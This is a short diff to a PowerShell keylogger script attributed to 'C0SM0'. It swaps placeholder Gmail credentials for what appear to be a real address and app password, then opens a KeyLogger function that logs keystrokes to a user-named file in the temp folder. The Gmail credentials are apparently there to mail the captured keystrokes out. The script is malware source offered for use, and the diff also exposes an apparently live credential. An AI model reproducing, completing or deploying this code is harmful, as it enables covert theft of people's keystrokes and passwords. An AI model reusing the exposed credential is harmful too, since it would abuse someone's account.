@@ -2,8 +2,8 @@
 # created by : C0SM0
 
 # gmail credentials
-$email = "example@gmail.com"
-$password = "password"
+$email = "goat3dmofo@gmail.com"
+$password = "qcihadixhgspywjw"
 
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
